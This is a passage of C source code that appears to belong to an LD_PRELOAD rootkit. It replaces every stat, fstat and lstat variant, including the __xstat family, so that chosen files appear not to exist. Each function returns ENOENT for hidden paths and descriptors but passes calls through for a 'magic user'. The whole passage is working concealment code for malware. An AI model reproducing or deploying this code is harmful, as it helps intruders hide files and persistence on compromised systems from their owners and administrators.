int stat(const char *pathname, struct stat *buf){
    hook(o_xstat,"__xstat");
    if(magic_user()) return o_xstat(_STAT_VER,pathname,buf);
    if(hxstat(pathname)) { errno=ENOENT; return -1; }
    return o_xstat(_STAT_VER,pathname,buf);
}
int stat64(const char *pathname, struct stat64 *buf){
    hook(o_xstat64,"__xstat64");
    if(magic_user()) return o_xstat64(_STAT_VER,pathname,buf);
    if(hxstat(pathname)) { errno=ENOENT; return -1; }
    return o_xstat64(_STAT_VER,pathname,buf);
}
int fstat(int fd, struct stat *buf){
    hook(o_fxstat,"__fxstat");
    if(magic_user()) return o_fxstat(_STAT_VER,fd,buf);
    if(hfxstat(fd)) { errno=ENOENT; return -1; }
    return o_fxstat(_STAT_VER,fd,buf);
}
int fstat64(int fd, struct stat64 *buf){
    hook(o_fxstat64,"__fxstat64");
    if(magic_user()) return o_fxstat64(_STAT_VER,fd,buf);
    if(hfxstat(fd)) { errno=ENOENT; return -1; }
    return o_fxstat64(_STAT_VER,fd,buf);
}
int lstat(const char *pathname, struct stat *buf){
    hook(o_lxstat,"__lxstat");
    if(magic_user()) return o_lxstat(_STAT_VER,pathname,buf);
    if(hxstat(pathname)) { errno=ENOENT; return -1; }
    return o_lxstat(_STAT_VER,pathname,buf);
}
int lstat64(const char *pathname, struct stat64 *buf){
    hook(o_lxstat64,"__lxstat64");
    if(magic_user()) return o_lxstat64(_STAT_VER,pathname,buf);
    if(hxstat(pathname)) { errno=ENOENT; return -1; }
    return o_lxstat64(_STAT_VER,pathname,buf);
}
int __xstat(int version, const char *pathname, struct stat *buf){
    hook(o_xstat,"__xstat");
    if(magic_user()) return o_xstat(version,pathname,buf);
    if(hxstat(pathname)) { errno=ENOENT; return -1; }
    return o_xstat(version,pathname,buf);
}
int __xstat64(int version, const char *pathname, struct stat64 *buf){
    hook(o_xstat64,"__xstat64");
    if(magic_user()) return o_xstat64(version,pathname,buf);
    if(hxstat(pathname)) { errno=ENOENT; return -1; }
    return o_xstat64(version,pathname,buf);
}
int __fxstat(int version, int fd, struct stat *buf){
    hook(o_fxstat,"__fxstat");
    if(magic_user()) return o_fxstat(version,fd,buf);
    if(hfxstat(fd)) { errno=ENOENT; return -1; }
    return o_fxstat(version,fd,buf);
}
int __fxstat64(int version, int fd, struct stat64 *buf){
    hook(o_fxstat64,"__fxstat64");
    if(magic_user()) return o_fxstat64(version,fd,buf);
    if(hfxstat(fd)) { errno=ENOENT; return -1; }
    return o_fxstat64(version,fd,buf);
}
int __lxstat(int version, const char *pathname, struct stat *buf){
    hook(o_lxstat,"__lxstat");
    if(magic_user()) return o_lxstat(version,pathname,buf);
    if(hxstat(pathname)) { errno=ENOENT; return -1; }
    return o_lxstat(version,pathname,buf);
}
int __lxstat64(int version, const char *pathname, struct stat64 *buf){
    hook(o_lxstat64,"__lxstat64");
    if(magic_user()) return o_lxstat64(version,pathname,buf);
    if(hxstat(pathname)) { errno=ENOENT; return -1; }
    return o_lxstat64(version,pathname,buf);
}
